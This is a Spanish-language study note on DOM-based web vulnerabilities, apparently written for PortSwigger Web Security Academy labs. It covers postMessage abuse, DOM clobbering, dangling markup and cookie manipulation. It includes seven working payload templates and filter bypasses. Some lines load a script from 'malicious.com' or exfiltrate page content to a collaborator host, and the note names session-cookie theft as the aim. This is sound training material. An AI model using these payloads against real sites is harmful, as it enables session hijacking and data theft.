---
aliases:
  - DOM-based
  - DOM-based vulnerabilities
  - dom-based-entrypoint
  - DOM clobbering
  - dangling markup
  - web messages
tags:
  - vuln/dom-based
  - entrypoint
---

# DOM-based vulnerabilities — Punto de entrada

> Documento **agnóstico al negocio**: responde *cómo **detectar y explotar** una vuln DOM-based*.
> **Dónde** aplica en el target (qué `.js`, qué acción) → eso vive en los `STAGE_x` (recon del negocio).

> [!abstract] La idea en una línea
> El servidor puede mandar la página **limpia**; el bug está en el **JavaScript del cliente**, que toma un **dato que vos controlás** (*source*) y lo mete en una **función peligrosa** (*sink*) **sin sanitizar**. Todo pasa en el navegador → no lo ves en la respuesta HTTP, lo ves **leyendo el JS**.

## 📚 Referencias rápidas

- 🧪 **Laboratorios** — 7 labs de la categoría DOM-based (Practitioner + Expert), con obfuscación, sink y qué se obtiene: [labs/README.md](labs/README.md)
- 📇 **Lista de sources y sinks** (para grepear el JS del target): [[vulnerabilities/025-dom-based/sinks|sinks & sources]]
- 🔗 **DOM XSS clásico** (source→sink dentro de una misma página: `location.search`→`innerHTML`, etc.) vive en [[vulnerabilities/002-xss/README#🌳 DOM XSS — source → sink|XSS → DOM]]. **Acá** cubrimos lo que va **más allá del XSS de una sola página**: web messages, open redirect, cookie manipulation, DOM clobbering, dangling markup.
- 🧰 **Herramienta clave:** **DOM Invader** (Burp built-in browser) automatiza el rastreo source→sink y tiene módulos para **postMessage** y **prototype pollution**.
- 🧰 **Método de entrega:** casi siempre **exploit server** con un `<iframe>` al target (para web messages, cookie manipulation, clobbering). Open redirect a veces es solo una **URL**.

## 🎯 El patrón universal: source → sink

Toda vuln DOM-based es lo mismo: **un dato controlable llega a una función peligrosa**.

1. **Source (dato que controlás):** `location.search` / `location.hash`, `document.referrer`, `document.cookie`, `window.name`, y **web messages** (`postMessage`). Lista completa → [[vulnerabilities/025-dom-based/sinks|sinks & sources]].
2. **Sink (dónde se usa sin sanitizar):** `eval()`, `innerHTML`, `document.write()`, `location.href`, `document.cookie`, `postMessage`, `setRequestHeader()`… Según el sink, el impacto cambia (XSS, open redirect, robo de header, etc.).
3. **El sink decide el impacto:** el **mismo** source puede dar XSS (`eval`/`innerHTML`) o solo open-redirect (`location`) o cookie-poisoning (`document.cookie`). Primero identificá **a qué sink llega**.

> [!danger] 🚩 ¿Está o no está? (la señal que grita "DOM-based")
> Abrí los `.js` del target (pestaña **Sources**/**Debugger**, o el JS enlazado) y buscá (Ctrl+F) estas cadenas. Si aparece **alguna**, es **altamente probable** que haya una vuln DOM-based:
> - `addEventListener("message"` / `onmessage` / `postMessage(` → **web message** sin chequeo de `origin`.
> - `eval(` / `Function(` / `setTimeout("…")` con un string → ejecución directa.
> - `innerHTML` / `outerHTML` / `document.write(` / `insertAdjacentHTML` → HTML sink.
> - `location` / `location.href` / `location.hash` / `document.cookie` como **destino** de un dato.
> - `window.X || {…}` (patrón OR con variable global) → candidato a **DOM clobbering**.
>
> **Regla mental:** *"veo un `postMessage`/`addEventListener('message')`/`eval` → asumo que hay bug hasta demostrar lo contrario"*.

## 🧪 Cómo cazarlo (metodología)

1. **Mapeá el JS:** listá los `.js` (sobre todo los que aparecen **nuevos** en `my-account`, checkout, home). Grepeá los sinks/sources de arriba.
2. **Rastreá source → sink** manualmente o con **DOM Invader** (activalo en el browser de Burp, navegá, y te marca cuándo un source llega a un sink).
3. **Identificá el sink concreto** → decide el impacto (¿XSS? ¿redirect? ¿cookie?).
4. **Controlá el source:**
   - `location.search`/`hash` → lo ponés en la **URL** que le mandás a la víctima.
   - `postMessage` → lo mandás desde un **`<iframe>`** en tu exploit server.
   - `document.cookie` → lo **envenenás** primero (cookie manipulation) y después se usa.
5. **Sortéa el filtro** si hay (`indexOf('http:')`, `JSON.parse`, `DOMPurify`) → ver twists abajo.
6. **Weaponizá:** `print()`/`alert(1)` como PoC, luego el payload real (robo de cookie, ATO). Entregá por exploit server.

> [!note] 🚚 ¿Requiere enviar exploit? (casi siempre SÍ)
> Estos bugs **no persisten** en el target: el fallo está en el **JS del cliente**, así que **no queda nada guardado** en el servidor esperando a la víctima. Para explotarlos **entregás** un `<iframe>`/URL por el **exploit server** y necesitás que la **víctima (o el admin) lo visite** — el `postMessage`, la cookie envenenada o el clobbering se disparan **en el navegador de quien abre tu página**.
> - **Excepciones:** el **open redirect** puede ser una **URL directa** (sin exploit server). El **DOM clobbering** de los labs sí se inyecta en un **comentario** (semi-persistido), pero el disparo final igual llega **entregando** un iframe que recarga la página.
> - **Objetivo final = el de un XSS:** robar la **cookie de sesión** (si no es `HttpOnly`) → *session hijack*, o **actuar en la sesión** de la víctima. Confirmás la visita por el **Access log** (IP distinta).

---

## 📨 Web messages (`postMessage` / `addEventListener`)

Una página A puede mandarle datos a una página B (aunque sean de **distinto origen**) con `postMessage`. B los recibe con un listener. **El bug:** B usa el contenido del mensaje en un sink **sin validar de dónde viene** (`event.origin`) ni **qué es** (`event.data`).

```js
// Código VULNERABLE típico en el target:
window.addEventListener('message', function (e) {
    document.getElementById('ads').innerHTML = e.data;   // sink innerHTML, sin chequear e.origin
});
```

**Explotación:** desde tu exploit server, montás un `<iframe>` al target y le disparás el mensaje en `onload`:

```html
<!-- innerHTML sink → img con onerror (innerHTML NO ejecuta <script>) -->
<iframe src="https://TARGET.web-security-academy.net/"
  onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
</iframe>
```

> [!tip] Twists de web message (los 3 labs)
> - **Filtro `indexOf('http:')`** sobre `e.data` + sink `location.href` → colás un `javascript:` y satisfacés el filtro con un comentario: `postMessage('javascript:print()//http:','*')`.
> - **`JSON.parse(e.data)`** → el mensaje debe ser JSON válido; mandás `'{"type":"load-channel","url":"javascript:print()"}'` y la `url` cae en un `iframe.src`.
> - **Sin chequeo de `origin`** → el `'*'` como `targetOrigin` funciona; si el código chequeara `e.origin` habría que ver si el match es débil (`indexOf`/`startsWith` mal usados).

---

## 🧬 DOM clobbering (cuando NO hay XSS pero sí HTML)

**Qué es (simple):** **inyectás HTML** (sin `<script>`, sin JS) para **crear elementos cuyo `id`/`name` "pisan" (clobber) una variable global** que el JavaScript de la página después usa. Cambiás el **comportamiento del JS** sin ejecutar JS propio. Sirve cuando **el XSS está filtrado** (p. ej. **DOMPurify** deja pasar `id`/`name`) pero podés meter algo de HTML (un comentario, un post).

**Por qué funciona:** en el DOM, un `<a id=foo>` crea automáticamente `window.foo`. El patrón peligroso del developer es:

```js
// Patrón VULNERABLE (variable global con fallback OR):
var someObject = window.someObject || {};
let url = someObject.url;      // ...y después usa esto como src de un <script>, avatar, etc.
```

Si `window.someObject` no existía, vale `{}`. Pero si **vos** metés HTML con ese `id`, `window.someObject` pasa a ser **tu nodo del DOM** → clobbereaste la variable.

```html
<!-- Dos <a> con el mismo id se agrupan en una colección; el name pisa la propiedad .url -->
<a id=someObject><a id=someObject name=url href="//malicious.com/evil.js">
```

> [!tip] Clobbering — los 2 labs Expert
> - **`window.defaultAvatar || {…}`** + **DOMPurify**: DOMPurify permite el protocolo **`cid:`**, que **no URL-encodea las comillas dobles** → colás `href="cid:&quot;onerror=alert(1)//"` y clobbereás `defaultAvatar.avatar` con un valor que rompe a XSS.
> - **Clobbear `attributes`**: una librería filtra recorriendo `element.attributes` → si metés `<input id=attributes>` dentro de un `<form>`, **clobbereás la propiedad `attributes`** (su `.length` queda `undefined`) y el filtro deja pasar tus atributos → `<form id=x tabindex=0 onfocus=print()><input id=attributes>` y disparás el `onfocus` con `#x` en la URL.

---

## 🪢 Dangling markup injection (marcado colgante)

**Qué es (simple):** cuando **podés inyectar HTML pero NO ejecutar JS** (CSP estricto, filtro que mata `<script>`/eventos), abrís una etiqueta que **queda "colgando"** (sin cerrar) → el navegador **se traga todo el HTML que le sigue** como parte de un atributo, y lo **manda a tu servidor**. Sirve para **exfiltrar** lo que hay después de tu inyección: un **CSRF token**, datos de la página, etc.

```html
<!-- El navegador manda al collaborator TODO lo que haya hasta la próxima comilla -->
<img src='https://BURP-COLLABORATOR/?exfil=
```

Todo el HTML entre tu `?exfil=` y la siguiente `'` viaja en la URL de la imagen → lo leés en el Collaborator. Variantes: `<img src="…`, `<a href="…`, o abrir un atributo de un elemento existente. Detalle y uso bajo CSP → [[vulnerabilities/002-xss/cheat-sheet#Scriptless / CSP — dangling markup|XSS cheat-sheet]].

> [!note] Cuándo elegir cada técnica
> - **Podés ejecutar JS** → DOM-XSS normal (`eval`/`innerHTML`/`postMessage`) → robás cookie / actuás en la sesión.
> - **No ejecutás JS pero metés HTML + hay id/name whitelisted** → **DOM clobbering**.
> - **No ejecutás JS ni clobbering, pero abrís una etiqueta** → **dangling markup** para **exfiltrar** (token/datos).

---

## 🗺️ Tipos de DOM-based vuln → sink de ejemplo

No es solo XSS: según el sink al que llegue el source, el bug es otro. Tabla oficial de PortSwigger:

| DOM-based vuln | Sink de ejemplo | Qué conseguís |
| -------------- | --------------- | ------------- |
| **DOM XSS** | `document.write()`, `innerHTML`, `eval()` | ejecutar JS → robo de sesión / ATO |
| **Open redirection** | `window.location`, `location.href` | redirigir a tu server (robar token en OAuth) |
| **Cookie manipulation** | `document.cookie` | envenenar una cookie que luego se usa en un sink → XSS |
| **JavaScript injection** | `eval()`, `Function()` | ejecución directa |
| **Document-domain manipulation** | `document.domain` | relajar SOP entre subdominios |
| **WebSocket-URL poisoning** | `WebSocket()` | apuntar el WS a tu server |
| **Link manipulation** | `element.src`, `element.href` | cargar recurso/nav a tu URL |
| **Web message manipulation** | `postMessage()` | mandar datos a otra ventana → sink |
| **Ajax request-header manipulation** | `setRequestHeader()` | inyectar headers |
| **Local file-path manipulation** | `FileReader.readAsText()` | leer archivo controlado |
| **Client-side SQL injection** | `ExecuteSql()` | SQLi en WebSQL |
| **HTML5-storage manipulation** | `sessionStorage/localStorage.setItem()` | envenenar storage usado luego |
| **Client-side XPath injection** | `document.evaluate()` | XPath injection |
| **Client-side JSON injection** | `JSON.parse()` | romper el parseo |
| **DOM-data manipulation** | `element.setAttribute()` | alterar atributos/comportamiento |
| **Denial of service** | `RegExp()` | ReDoS en el cliente |

> Los que aparecen en labs / examen con más frecuencia: **DOM XSS, open redirection (OAuth), cookie manipulation, web message, DOM clobbering**.

## 🐍 Plantillas (reemplazá lo <mark>resaltado</mark>)

**1) Web message → innerHTML sink**
```html
<iframe src="https://TARGET.web-security-academy.net/"
  onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
</iframe>
```

**2) Web message con filtro `indexOf('http:')` → location.href**
```html
<iframe src="https://TARGET.web-security-academy.net/"
  onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
</iframe>
```

**3) Web message con `JSON.parse`**
```html
<iframe src="https://TARGET.web-security-academy.net/"
  onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
</iframe>
```

**4) DOM-based open redirection (solo URL)**
```
https://TARGET.web-security-academy.net/post?postId=4&url=https://EXPLOIT.exploit-server.net/
```

**5) Cookie manipulation (envenenar `document.cookie` vía iframe y redirigir)**
```html
<iframe src="https://TARGET.web-security-academy.net/product?productId=1&'><script>print()</script>"
  onload="if(!window.x)this.src='https://TARGET.web-security-academy.net';window.x=1;">
</iframe>
```

**6) DOM clobbering (anchors que pisan una global)**
```html
<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

**7) Dangling markup (exfiltrar lo que sigue, sin ejecutar JS)**
```html
<img src='https://BURP-COLLABORATOR/?exfil=
```

> [!note] Relación con XSS, CSRF y OAuth
> - Muchos DOM-based terminan en **XSS** → el *qué hacer después* (robo de cookie, actuar en la sesión) está en [[vulnerabilities/002-xss/README#🎯 Qué hacer con un XSS (objetivos de explotación)|XSS → objetivos]].
> - **Open redirect** DOM-based es munición para **OAuth/token theft** (robar el `code`/token en el `redirect_uri`) → [[vulnerabilities/026-oauth/oauth|OAuth]].
> - Casi todo se **entrega por exploit server** (iframe) → misma mecánica de víctima que [[vulnerabilities/004-clickjacking/clickjacking|clickjacking]] y CSRF entregado.
